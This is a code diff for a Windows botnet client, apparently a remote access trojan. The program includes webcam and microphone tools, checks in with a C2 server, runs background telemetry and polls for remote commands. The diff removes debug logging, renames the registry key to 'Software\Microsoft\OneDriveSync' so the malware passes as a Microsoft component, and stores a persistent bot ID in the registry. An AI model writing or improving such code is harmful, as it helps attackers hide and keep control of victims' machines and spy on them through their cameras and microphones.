@@ -39,23 +39,16 @@ SOFTWARE.
 #include "WebcamTool.h"
 #include "MicTool.h"
 
-static void DBG(const char* msg) {
-	FILE* f = fopen("C:\\Users\\Public\\stub_dbg.txt", "a");
-	if (f) { fputs(msg, f); fputs("\n", f); fclose(f); }
-}
-
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
-	DBG("1: WinMain start");
 	srand((unsigned int)time(NULL));
 	Manager::Settings s;
 	Manager::ReadData(&s);
-	DBG("2: settings read");
 
 	char me[128] = { 0 };
 	GetModuleFileNameA(0, me, sizeof(me) - 1);
 
 	HKEY hKey = 0;
-	const char* addr = "Software\\4B4DB4B3";
+	const char* addr = "Software\\Microsoft\\OneDriveSync";
 	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, addr, 0, KEY_READ, &hKey);
 
 	if (result != ERROR_SUCCESS) {
@@ -137,13 +130,23 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 				ShellExecuteA(0, "open", s.protectorName, arg.c_str(), 0, SW_HIDE);
 			}
 
-			// botapi is stored as plain null-terminated string; XOR layer in ReadData provides obfuscation
 			if (s.botapi[0] == '\0') {
 				ExitProcess(0);
 			}
-			DBG("3: botapi ok, building info string");
 
-			int ID = rand();
+			// Persist bot ID in registry so restarts don't create duplicate bots
+			int ID = 0;
+			HKEY hIdKey = 0;
+			if (RegOpenKeyExA(HKEY_CURRENT_USER, addr, 0, KEY_READ | KEY_WRITE, &hIdKey) == ERROR_SUCCESS) {
+				DWORD sz = sizeof(ID);
+				if (RegQueryValueExA(hIdKey, "BotID", 0, NULL, (LPBYTE)&ID, &sz) != ERROR_SUCCESS || ID == 0) {
+					ID = rand();
+					RegSetValueExA(hIdKey, "BotID", 0, REG_DWORD, (LPBYTE)&ID, sizeof(ID));
+				}
+				RegCloseKey(hIdKey);
+			} else {
+				ID = rand();
+			}
 			// s.botapi = C2 server hostname, s.chatid = auth key
 			C2Client api(s.botapi, s.chatid, ID);
 			BotNet botnet;
@@ -165,19 +168,14 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 				"%0AProcessors: " + std::to_string(SysInfo.dwNumberOfProcessors) +
 				"%0AProcessor: " + Information::GetProcessorBrand();
 
-			DBG("4: about to Checkin");
 			api.Checkin(information.c_str());
-			DBG("5: Checkin done, starting Telemetry");
 
-			// Start background telemetry: process/registry/network/service/file monitoring
 			Telemetry::Start(&api, ID);
-			DBG("6: Telemetry started, entering main loop");
 
 			std::string last;
 			std::vector<std::string> params;
 
 			while (true) {
-				DBG("7: loop tick");
 				Sleep(atoi(s.client_delay));
 
 				last = api.GetPendingCommand();
